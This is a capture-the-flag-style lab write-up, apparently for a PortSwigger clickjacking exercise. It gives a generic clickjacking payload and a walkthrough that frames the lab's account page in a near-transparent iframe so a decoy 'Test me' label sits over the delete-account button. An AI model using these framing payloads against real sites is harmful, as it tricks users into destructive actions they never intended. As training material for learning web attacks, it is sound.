Title: Basic clickjacking with CSRF token protection
Desc:  This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.
To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.
You can log in to your own account using the following credentials: wiener:peter 


# Theory:
Example of clickjacking payload:
```
<head>
	<style>
		#target_website {
			position:relative;
			width:128px;
			height:128px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			}
	</style>
</head>
...
<body>
	<div id="decoy_website">
	...decoy web content here...
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>
```

# Walkthrough:
Go to the exploit server and store this example and then click view exploit:
```
<style>
    iframe {
        position:relative;
        width: 400;
        height: 150;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 50;
        left: 5;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://0a1200ca0447e04480af7bda00ed00e6.web-security-academy.net/my-account"></iframe>
```
You will get this:
<img width="767" height="251" alt="image" src="https://github.com/user-attachments/assets/89735f9d-afa1-4772-bd1a-0bdb86b36b78" />

You can see, that we have "Test me" and under the "Test me" you can see the iframe. Now, this iframe is positioned badly, because we want Delte button under "Test me" so I need to change my exploit a little.

I changed my code to: 
```
<style>
    iframe {
        position:relative;
        width: 400;
        height: 550;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 486;
        left: 50;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://0a1200ca0447e04480af7bda00ed00e6.web-security-academy.net/my-account"></iframe>
```
and now I have elements on good positions.

<img width="842" height="597" alt="image" src="https://github.com/user-attachments/assets/998d9cb7-8e35-43d2-a34a-986f96682ea8" />

<img width="844" height="374" alt="image" src="https://github.com/user-attachments/assets/6dfb2d43-085d-493d-8275-8cc84bfb2af6" />


